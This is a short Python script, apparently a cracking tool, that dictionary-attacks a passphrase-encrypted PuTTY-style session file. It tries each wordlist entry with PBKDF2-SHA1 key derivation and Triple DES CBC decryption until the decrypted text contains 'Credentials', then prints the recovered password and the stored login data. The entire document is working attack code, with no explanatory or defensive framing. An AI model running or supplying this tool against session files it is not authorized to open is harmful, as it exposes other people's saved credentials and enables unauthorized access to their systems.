import base64
import sys
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key using PBKDF2
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=24,
            salt=salt,
            iterations=1000,
            backend=default_backend()
        )
        key = kdf.derive(passphrase.encode())

        # Create the Triple DES cipher in CBC mode
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        # Decrypt the data
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remove padding (PKCS7 padding)
        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        # Decode ASCII characters
        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        print(f'Error: {e}')

    return data

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} putty_session.dat wordlist.txt')
    exit(1)

with open(sys.argv[1]) as f:
    cipher = f.read()

with open(sys.argv[2]) as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        decrypted = decrypt(password, cipher)
        print(f'[{i}] {password=}', end='\r')
        if 'Credentials' in decrypted:
            print(f'\r[{i}] {password=} {" " * 10}')
            print()
            print(decrypted)
            break
